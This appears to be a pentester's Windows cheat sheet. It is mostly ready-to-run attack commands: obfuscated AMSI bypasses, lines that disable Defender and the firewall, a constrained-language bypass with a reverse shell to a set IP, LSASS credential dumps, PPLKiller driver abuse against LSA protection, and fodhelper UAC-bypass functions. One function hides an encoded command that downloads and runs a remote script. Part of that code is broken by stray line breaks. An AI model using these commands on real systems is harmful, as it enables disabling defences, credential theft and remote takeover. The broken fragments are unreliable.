
### Checklists

#### Windows
- https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation

## AMSI

```powershell
$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
```

```powersehll
$fjujQSw=$null;$bfky="$(('S'+'y'+'s'+'t'+'e'+'m').nOrMAlIze([ChAr](70*40/40)+[CHaR]([byte]0x6f)+[chAr](94+20)+[ChaR](109+62-62)+[ChAR](27+41)) -replace [chAr](92)+[CHaR]([BYTe]0x70)+[cHar](23+100)+[cHar]([byTe]0x4d)+[chAR]([bYtE]0x6e)+[cHar]([byte]0x7d)).$(('Mãnàg'+'ement').NOrmAliZE([CHAR]([BYTe]0x46)+[chAr](36+75)+[CHaR](114)+[cHAr](63+46)+[CHaR](17+51)) -replace [cHAR](41+51)+[ChAR](112*76/76)+[cHAr]([byTe]0x7b)+[cHar](77+13-13)+[chaR]([BYTe]0x6e)+[ChAR](125+9-9)).$([cHAR](65)+[CHaR]([BYte]0x75)+[CHAR](116+72-72)+[CHAR](67+44)+[chAR]([bytE]0x6d)+[chAr](97+9-9)+[Char](116*72/72)+[CHAr]([byte]0x69)+[Char]([byTe]0x6f)+[chaR]([Byte]0x6e)).$([CHAR]([BYte]0x41)+[char]([ByTe]0x6d)+[cHAr](115+39-39)+[CHAR]([Byte]0x69)+[cHaR](85*12/12)+[chAR]([byte]0x74)+[ChaR](105*12/12)+[ChaR]([BytE]0x6c)+[char](115))";$dgbiziuzftrzlf="+[cHaR]([byTE]0x6c)+[CHAr]([BYTE]0x70)+[chAr]([byte]0x7a)+[cHar]([bYtE]0x74)+[cHAR](105)+[ChAR](118+34-34)+[cHAR](101)+[CHAr](97)+[CHAR]([Byte]0x63)+[cHAR]([ByTE]0x65)+[CHaR](106)+[ChAR]([BYte]0x73)+[ChAR]([BYte]0x61)+[CHar](121+46-46)+[Char]([BYTe]0x61)+[CHaR](106)+[chAr]([Byte]0x67)+[cHAR](78+21)+[CHar](111*77/77)+[CHAr](91+17)+[CHAR](111+29-29)+[CHaR](1+106)+[ChAr](115+76-76)+[cHAR](92+19)+[char]([bYTe]0x65)+[cHar]([bytE]0x7a)+[CHAr](97*40/40)+[char]([bYTE]0x6d)+[cHaR](110*34/34)";[Threading.Thread]::Sleep(851);[Runtime.InteropServices.Marshal]::("$(('Wrìte'+'Înt32').NOrmalize([CHaR](51+19)+[Char](111)+[cHAr](114*43/43)+[cHaR](75+34)+[CHAR]([bYTE]0x44)) -replace [cHar](70+22)+[chAR]([bYtE]0x70)+[Char](108+15)+[chAr]([byTE]0x4d)+[ChaR](110)+[CHar](125*16/16))")([Ref].Assembly.GetType($bfky).GetField("$([CHAR]([bYtE]0x61)+[CHaR]([bYtE]0x6d)+[CHar]([byTe]0x73)+[ChaR]([bytE]0x69)+[chAR]([ByTE]0x43)+[CHAR](62+49)+[CHaR](110+108-108)+[chAr]([ByTe]0x74)+[chAR]([BYte]0x65)+[cHAR]([BYTE]0x78)+[char]([ByTE]0x74))",[Reflection.BindingFlags]"NonPublic,Static").GetValue($fjujQSw),0x32aaa0ce);  
```

#### Sites:
 - https://amsi.fail/
 - https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#disable-defender
 - https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/

## Windows Defender/AV

- Tamper Protection status:
	- If the output is `False`, Tamper Protection is enabled.
	-  If the output is `True`, Tamper Protection is disabled.
```powershell
(Get-MpPreference).DisableTamperProtection
```

- Disable Defender if Tamper Protection is off
```powershell
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
```

- cmd
```cmd
cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all  
```

- disable firewall
```powershell
NetSh Advfirewall set allprofiles state off
```


#### Evasion Methodology

- https://book.hacktricks.xyz/windows-hardening/av-bypass#av-evasion-methodology



## Constrained Language Mode (CLM)

##### Check if in CLM:

```powershell
$ExecutionContext.SessionState.LanguageMode
```


- altbypass (https://github.com/Octoberfest7/OSEP-Tools/tree/main/altbypass)...have compiled on Win11 and in www directory

#### PSByPassCLM (Windows Server 2016 Tested)
- https://github.com/padovah4ck/PSByPassCLM

Direct bypass:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

Reverse shell:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

## PowerView

#### Basic Enumeration

- https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#disable-defender

#### Laps Passwords

```powershell
Get-DomainComputer  | Select-Object 'dnshostname','ms-mcs-admpwd' | Where-Object {$_."ms-mcs-admpwd" -ne $null}
```

#### Find History

```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

```powershell
Get-ChildItem "C:\Users" -Directory | ForEach-Object { $h = "$($_.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; if (Test-Path $h) { Get-Content $h | ForEach-Object { "$($_.Name): $_" } } }
Get-ChildItem "C:\Users" -Directory | ForEach-Object { $h = "$($_.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; if (Test-Path $h) { Get-Content $h | ForEach-Object { "$($_.Name): $_" } } }
```

#### Running commands on other machines

```powershell
Invoke-Command -ComputerName $computer -Credential $credential -ScriptBlock { <insert commands here> }
```

## Applocker/Application Whitelisting

```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

#### If rules allow exe in certain folders, these are usually writeable
```powershell
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

#### Bypass Strategies
- https://aj-labz.gitbook.io/aj-labz/offensive-cyberz/defense-evasion/evade-heuristic-behaviors/applocker-bypass
- using remote.exe https://mrd0x.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/
- lolbas https://lolbas-project.github.io/#

## Mimikatz



## Word Macros



## HTA





## Sharphound



## Active Directory

#### Force an update
```cmd
gpupdate /force
```



## Skeleton of Code

### HTA

```html
<html>
<head>
<script language="JScript">

<!-- ADD output from DotNetToJScript here. -->

window.resizeTo(0, 0);
window.moveTo(-32000, -32000);
</script>
<hta:application 
    showInTaskbar="no" 
    border="none" 
    caption="no" 
    maximizeButton="no" 
    minimizeButton="no" 
    sysMenu="no" 
    scroll="no"
/>
</head>
<body onload="window.blur();">
</body>
</html>
```


### Dump LSAS

```
rundll32 comsvcs MiniDump 0<pid> <filename> full
rundll32 comsvcs MiniDump +<pid> <filename> full
rundll32 comsvcs `#+24 <pid> <filename> full
rundll32 comsvcs, `#00000000000000000000024 <pid>  <filename> full
rundll32 "comsvcs"`#+24 <pid> <filename> full
rundll32 comsvcs,`#65560 <pid> <filename> full
```

### LSA Protection

- use PPLKiller https://github.com/RedCursorSecurityConsulting/PPLKiller
1. Open PPLKiller.sln with Visual Studio 2019 and build a Release binary which will be saved in PPLKiller\x64\Release\PPLKiller.exe
2. You'll always want to run `PPLKiller.exe /installDriver` first to install the driver
3. Run an attack like `PPLKiller.exe /disableLSAProtection`
4. Cleanup with `PPLKiller.exe /uninstallDriver`
```powershell
PS C:\users\public\downloads> sc.exe create RTCore64 type= kernel start= auto binPath= c:\users\public\downloads\RTCore64.sys DisplayName= "Micro - Star MSI Afterburner"
net start RTCore64

sc.exe create RTCore64 type= kernel start= auto binPath= c:\users\public\downloads\RTCore64.sys DisplayName= "Micro - Star MSI Afterburner"
[SC] CreateService SUCCESS
PS C:\users\public\downloads> net start RTCore64

The Micro - Star MSI Afterburner service was started successfully.

PS C:\users\public\downloads> Get-Process -Name lsass
Get-Process -Name lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                         
-------  ------    -----      -----     ------     --  -- -----------                                         
   1069      30     5920      17568       1.17    556   0 lsass                                               

PS C:\users\public\downloads> .\pplk /disablePPL 556
.\pplk /disablePPL 556
[*] Device object handle has been obtained
[*] Ntoskrnl base address: FFFFF80535EAD000
[*] PsInitialSystemProcess address: FFFFA78B86461040
[*] Current process address: FFFFA78B89AB3080
PPLKiller version 0.3 by @aceb0nd
[+] Windows Version 1809 Found
```

- https://www.bordergate.co.uk/bypassing-lsa-protections/

## Powershell Fodhelper bypass

```powershell
function FodhelperBypass(){ 
 Param (
           
        [String]$program = "cmd /c start powershell.exe" #default
       )

    #Create registry structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

    #Perform the bypass
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    #Remove registry structure
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

}

```

```powershell
function RegStuff { 
	$cmd = "C:\Windows\Tasks\foo.exe -enc aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA2ADgALwByAGUALgBwAHMAMQAnACkA" 
	copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe  C:\Windows\Tasks\foo.exe 
	Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue 
	New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force 
	New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force 
	Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force 
	} f
	unction PrivEsc { 
	Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden Start-
	Sleep -s 3 
	Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue 
	} 
RegStuff
```


## MSSQL

#### Users who can be impersonated:

```sql
SELECT p.name AS PrincipalName, p.type_desc AS PrincipalType, perm.permission_name AS Permission, r.name AS RoleName FROM sys.server_permissions AS perm JOIN sys.server_principals AS p ON perm.grantee_principal_id = p.principal_id LEFT JOIN sys.server_role_members AS rm ON p.principal_id = rm.member_principal_id LEFT JOIN sys.server_principals AS r ON rm.role_principal_id = r.principal_id WHERE perm.permission_name = 'IMPERSONATE' OR r.name IS NOT NULL;
```